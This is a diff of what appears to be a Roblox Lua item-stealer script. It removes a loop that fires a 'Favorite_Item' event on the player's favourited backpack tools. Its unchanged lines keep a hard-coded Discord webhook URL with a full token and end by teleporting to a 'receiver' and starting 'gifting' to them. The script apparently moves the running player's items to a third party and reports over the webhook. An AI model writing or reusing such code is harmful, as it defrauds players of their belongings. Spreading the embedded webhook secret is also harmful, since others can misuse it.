@@ -1,16 +1,3 @@
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local FavoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
-
-for _, tool in ipairs(Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
-    for _, descendant in ipairs(tool:GetDescendants()) do
-        if descendant:IsA("ImageLabel") and descendant.Name == "FavoriteIcon" then
-            FavoriteEvent:FireServer(tool)
-            break
-        end
-    end
-end
-
 local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"
 
 local RunService = game:GetService("RunService")
@@ -800,3 +787,5 @@ if not receiver then return end
 
 teleportToPlayer(receiver)
 startGifting(receiver)
+
+
